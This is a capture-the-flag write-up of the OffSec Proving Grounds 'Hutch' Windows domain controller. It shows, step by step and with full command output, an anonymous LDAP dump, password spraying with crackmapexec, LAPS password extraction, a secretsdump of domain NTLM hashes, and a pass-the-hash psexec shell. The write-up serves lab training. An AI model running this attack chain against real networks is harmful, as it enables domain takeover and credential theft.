---
title: Writeup - Offsec PG Hutch
date: 2023-09-25  
author: kei5uke
description: Writeup for PG Hutch 
tags:
  - windows
  - writeup
---

# Hutch

# Enumeration with Nmap

`nmap -p- -sC -sV 192.168.175.122 -T4 -oN nmap.out`

```bash
┌──(root💀kali)-[~/hatch]
└─# nmap -p- -sC -sV 192.168.175.122 -T4 -oN nmap.out
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 23:53 EEST
Nmap scan report for 192.168.175.122
Host is up (0.046s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Mon, 25 Sep 2023 20:55:58 GMT
|   Server Type: Microsoft-IIS/10.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-25 20:55:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49874/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-09-25T20:55:59
|_  start_date: N/A
```

Webdav is allowed in port 80  
LDAP is enabled  
Domain name is hutch.offsec  

# Enumerating LDAP

Let’s search ldap with ldapsearch

`ldapsearch -x -b "dc=hutch,dc=offsec" -h 192.168.175.122 > ldap.txt`

![Screenshot 2023-09-26 at 00.24.37.png](Hutch%20aac63fefd54b41fd85acd5e7ed833711/Screenshot_2023-09-26_at_00.24.37.png)

Command result contains a lot of information.   
I grepped the list of account by sAMAccountName.  

`grep -oP "(?<=sAMAccountName:).*" ldap.txt`

```bash
Guest
 Domain Computers
 Cert Publishers
 Domain Users
 Domain Guests
 Group Policy Creator Owners
 RAS and IAS Servers
 Allowed RODC Password Replication Group
 Denied RODC Password Replication Group
 Enterprise Read-only Domain Controllers
 Cloneable Domain Controllers
 Protected Users
 DnsAdmins
 DnsUpdateProxy
 rplacidi
 opatry
 ltaunton
 acostello
 jsparwell
 oknee
 jmckendry
 avictoria
 jfrarey
 eaburrow
 cluddy
 agitthouse
 fmcsorley
```

I found interesting information in the result. It can be used later for user enumeration.

```bash
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
```

# Enumerating Users

Based on the gathered information from ldapsearch, I searched users and corresponding password.

Let’s find users and corresponding password with crackmapexec with smb option

```bash
┌──(root💀kali)-[~/hatch]
└─# crackmapexec smb 192.168.175.122 -u ./users.txt -p ./pass.txt --continue-on-success
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         192.168.175.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Guest:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Domain Computers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Cert Publishers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Domain Users:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Domain Guests:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Group Policy Creator Owners:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\RAS and IAS Servers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Allowed RODC Password Replication Group:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Denied RODC Password Replication Group:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Enterprise Read-only Domain Controllers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Cloneable Domain Controllers:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\Protected Users:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\DnsAdmins:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\DnsUpdateProxy:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\opatry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\acostello:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\oknee:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\avictoria:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\cluddy:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.175.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
```

Now we got the valid username and password: `fmcsorley:CrabSharkJellyfish192`

With this user info, we can find user list with Impacket GetADUsers.py

```bash
┌──(root💀kali)-[~/hatch]
└─# GetADUsers.py -all -dc-ip 192.168.175.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 192.168.175.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2023-09-25 23:50:22.722364  2020-11-04 07:58:40.654236 
Guest                                                 <never>              <never>             
krbtgt                                                2020-11-04 07:26:23.099902  <never>             
rplacidi                                              2020-11-04 07:35:05.106274  <never>             
opatry                                                2020-11-04 07:35:05.216273  <never>             
ltaunton                                              2020-11-04 07:35:05.264272  <never>             
acostello                                             2020-11-04 07:35:05.315273  <never>             
jsparwell                                             2020-11-04 07:35:05.377272  <never>             
oknee                                                 2020-11-04 07:35:05.433274  <never>             
jmckendry                                             2020-11-04 07:35:05.492273  <never>             
avictoria                                             2020-11-04 07:35:05.545279  <never>             
jfrarey                                               2020-11-04 07:35:05.603273  <never>             
eaburrow                                              2020-11-04 07:35:05.652273  <never>             
cluddy                                                2020-11-04 07:35:05.703274  <never>             
agitthouse                                            2020-11-04 07:35:05.760273  <never>             
fmcsorley                                             2020-11-04 07:35:05.815275  2021-02-16 15:39:34.483491 
domainadmin                                           2021-02-16 07:24:22.190351  2023-09-25 23:47:29.894236
```

I added Administrator and domainadmin to the users.txt

# Finding users with better privilege

crackmapexec ldap laps module let’s you find LAPS info

```bash
┌──(root💀kali)-[~/hatch]
└─# crackmapexec ldap 192.168.175.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.175.122 -M laps
/usr/lib/python3/dist-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
LDAP        192.168.175.122 389    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
LDAP        192.168.175.122 389    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
LAPS        192.168.175.122 389    HUTCHDC          [*] Getting LAPS Passwords
LAPS        192.168.175.122 389    HUTCHDC          Computer: HUTCHDC$             Password: yH{w0s#-B.yV50
```

`Password: yH{w0s#-B.yV50` is added to the password list.

Run the same command: `crackmapexec smb 192.168.175.122 -u ./users.txt -p ./pass.txt --continue-on-success`

and I got the new result

`SMB 192.168.175.122 445 HUTCHDC [+] hutch.offsec\Administrator:yH{w0s#-B.yV50 (Pwn3d!)`

Fortunately, this belongs to the Admin.

Let’s get NTLM hash with Impacket script: secretdump.py

```bash
┌──(root💀kali)-[~/hatch]
└─# secretsdump.py hutch.offsec/administrator:'yH{w0s#-B.yV50'@192.168.175.122
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb24173e6ac9aa789ab05a4acceeb27ba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bab179eba40e413086aa37742476c646:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
.
.
.
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:333078b4951591731a68da1d3fb53cdb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3c37d961d2fbbc1eb9e4d09f145ad361:::
hutch.offsec\rplacidi:1103:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\opatry:1104:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\ltaunton:1105:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\acostello:1106:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jsparwell:1107:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\oknee:1108:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jmckendry:1109:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\avictoria:1110:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jfrarey:1111:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\eaburrow:1112:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\cluddy:1113:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\agitthouse:1114:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\fmcsorley:1115:aad3b435b51404eeaad3b435b51404ee:83bcf188adc71adef071303fae29c1c7:::
hutch.offsec\domainadmin:1116:aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7:::
HUTCHDC$:1000:aad3b435b51404eeaad3b435b51404ee:151657b4aa87d85cebc0543e9d1f095b:::
```

# Getting the shell

`psexec.py Administrator@192.168.175.122 -hashes aad3b435b51404eeaad3b435b51404ee:333078b4951591731a68da1d3fb53cdb`

![Screenshot 2023-09-26 at 01.04.32.png](Hutch%20aac63fefd54b41fd85acd5e7ed833711/Screenshot_2023-09-26_at_01.04.32.png)

# Summary 
Cracking Windows machines has always posed a challenge for me. In this instance, the LDAP protocol emerged as the pivotal factor in gaining access to critical information. I delved into the world of Impacket scripts for robust Active Directory enumeration and mastered the intricacies of psexec.

Having rooted nearly 30 machines on the proving ground, I'm left with the sense that there are still protocols waiting to be unraveled. I'm determined to keep honing my skills until I feel completely at ease with any protocol I encounter.

